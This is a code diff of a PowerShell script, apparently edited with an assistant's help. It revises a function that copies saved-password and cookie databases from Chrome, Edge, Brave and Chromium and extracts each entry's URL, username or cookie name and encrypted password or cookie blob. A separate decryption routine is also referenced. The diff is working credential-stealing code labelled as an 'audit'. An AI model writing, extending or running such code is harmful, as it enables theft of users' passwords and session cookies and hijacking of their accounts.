@@ -612,14 +612,13 @@ function Decrypt-ChromeKeyBlob {
     else {
         throw "[*] Unsupported flag: $($ParsedData.Flag)"
     }
-}
-function Get-ChromiumLoginBlobs {
+}function Get-ChromiumLoginBlobs {
     param(
         [string]$Browser,
-        [switch]$Cookies 
+        [switch]$Cookies # This switch toggles between Passwords and Cookies
     )
 
-    # 1. Path Logic: Choose the right database file
+    # 1. Path Selection: Cookies live in 'Network\Cookies', Passwords live in 'Login Data'
     $TargetFile = if ($Cookies) { "Default\Network\Cookies" } else { "Default\Login Data" }
 
     switch ($Browser.ToLower()) {
@@ -628,63 +627,53 @@ function Get-ChromiumLoginBlobs {
         "edge"     { $DataPath = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data\$TargetFile" }
         "brave"    { $DataPath = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data\$TargetFile" }
         "chromium" { $DataPath = Join-Path $env:LOCALAPPDATA "Chromium\User Data\$TargetFile" }
-        default    { return "`n[-] Unsupported browser name: $Browser" }
+        default    { $DataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\$TargetFile" }
     }
 
     if (-not (Test-Path -Path $DataPath)) { return $false }
 
-    # 2. Setup SQLite constants
+    # 2. SQLite Setup
     [int]$SqliteOk = 0
     [int]$SqliteRow = 100
     [int]$SqliteOpenReadOnly = 1
-    $TempDatabasePath = Join-Path $env:TEMP ("$($Browser)_Audit_{0}.db" -f ([guid]::NewGuid()))
+    $TempDatabasePath = Join-Path $env:TEMP ("Audit_{0}.db" -f ([guid]::NewGuid()))
 
     try {
         Copy-Item -LiteralPath $DataPath -Destination $TempDatabasePath -Force -ErrorAction Stop
     }
     catch {
-        return "[-] Unable to copy database file from $DataPath"
+        return "[-] Unable to copy database file"
     }
 
     $DatabasePointer = [IntPtr]::Zero
     $StatementPointer = [IntPtr]::Zero
 
-    # 3. Dynamic SQL Query (This is where the magic happens)
-    # If -Cookies is used, we look for host/path/name. Otherwise, realm/url/user.
+    # 3. Dynamic SQL Query Logic
     if ($Cookies) {
         $SqlQuery = 'SELECT host_key, path, name, encrypted_value FROM cookies'
     } else {
         $SqlQuery = 'SELECT signon_realm, origin_url, username_value, password_value FROM logins'
     }
 
-    # 4. Open and Prepare Database
+    # 4. Execute Database Connection
     $ResultCode = $Sqlite3OpenV2.Invoke($TempDatabasePath, [ref]$DatabasePointer, $SqliteOpenReadOnly, [IntPtr]::Zero)
-    if ($ResultCode -ne $SqliteOk) {
-        return "[-] SQLite Open Failed: $ResultCode"
-    }
+    if ($ResultCode -ne $SqliteOk) { return "[-] SQLite Open Failed" }
 
     $ResultCode = $Sqlite3PrepareV2.Invoke($DatabasePointer, $SqlQuery, -1, [ref]$StatementPointer, [IntPtr]::Zero)
-    if ($ResultCode -ne $SqliteOk) {
-        return "[-] SQLite Prepare Failed: $ResultCode"
-    }
+    if ($ResultCode -ne $SqliteOk) { return "[-] SQLite Prepare Failed" }
 
-    $Results = @()
-
-    # 5. Extraction Loop
+    # 5. Extraction Loop (Using your original variable names)
+    $LoginResults = @()
     while ($Sqlite3Step.Invoke($StatementPointer) -eq $SqliteRow) {
-        $Col0Ptr = $Sqlite3ColumnText.Invoke($StatementPointer, 0) # Host or Realm
-        $Col1Ptr = $Sqlite3ColumnText.Invoke($StatementPointer, 1) # Path or URL
-        $Col2Ptr = $Sqlite3ColumnText.Invoke($StatementPointer, 2) # Name or Username
+        $Col0Ptr = $Sqlite3ColumnText.Invoke($StatementPointer, 0) # URL or Host
+        $Col2Ptr = $Sqlite3ColumnText.Invoke($StatementPointer, 2) # Username or Cookie Name
         $BlobPtr = $Sqlite3ColumnBlob.Invoke($StatementPointer, 3) # Encrypted Data
         $BlobSize = $Sqlite3ColumnByte.Invoke($StatementPointer, 3)
 
-        $Val0 = if ($Col0Ptr -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($Col0Ptr) } else { "" }
-        $Val1 = if ($Col1Ptr -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($Col1Ptr) } else { "" }
-        $Val2 = if ($Col2Ptr -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($Col2Ptr) } else { "" }
+        $Url = if ($Col0Ptr -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($Col0Ptr) } else { "" }
+        $Username = if ($Col2Ptr -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($Col2Ptr) } else { "" }
         
-        # Use Host/Realm if available, otherwise URL/Path
-        $SourceUrl = if ($Val0) { $Val0 } else { $Val1 }
-        if (-not $SourceUrl) { continue }
+        if (-not $Url) { continue }
 
         $RawData = @()
         if ($BlobSize -gt 0 -and $BlobPtr -ne [IntPtr]::Zero) {
@@ -694,21 +683,21 @@ function Get-ChromiumLoginBlobs {
 
         if ($RawData.Length -eq 0) { continue }
 
+        # Basic Header Detection
         $Header3 = [Text.Encoding]::ASCII.GetString($RawData, 0, [Math]::Min(3, $RawData.Length))
-        $Header5 = [Text.Encoding]::ASCII.GetString($RawData, 0, [Math]::Min(5, $RawData.Length))
-        $Type = if ($Header5 -eq "DPAPI") { "DPAPI" } elseif ($Header3 -eq "v10") { "v10" } else { "Other" }
+        $BlobHeaderType = if ($Header3 -eq "v10") { "v10" } else { "DPAPI" }
 
-        # Add to the final list
-        $Results += [PSCustomObject]@{
-            Browser    = $Browser
-            URL        = $SourceUrl
-            Identifier = $Val2 # This will be the Username or the Cookie Name
-            BlobHeader = $Type
-            Base64Data = [Convert]::ToBase64String($RawData)
+        # --- KEEPING ORIGINAL NAMES FOR YOUR REPORT GENERATOR ---
+        $LoginResults += [PSCustomObject]@{
+            Browser                 = $Browser
+            URL                     = $Url
+            Username                = $Username
+            BlobHeader              = $BlobHeaderType
+            Base64EncryptedPassword = [Convert]::ToBase64String($RawData)
         }
     }
 
-    # 6. Cleanup Logic (The "Safe" Way)
+    # 6. Cleanup Logic
     if ($StatementPointer -ne [IntPtr]::Zero) { [void]$Sqlite3Finalize.Invoke($StatementPointer) }
     if ($DatabasePointer -ne [IntPtr]::Zero) { [void]$Sqlite3Close.Invoke($DatabasePointer) }
 
@@ -720,7 +709,7 @@ function Get-ChromiumLoginBlobs {
         Remove-Item -Path $TempDatabasePath -Force -ErrorAction SilentlyContinue
     }
 
-    return $Results
+    return $LoginResults
 }
 
 # The script should then continue to the next part, like:
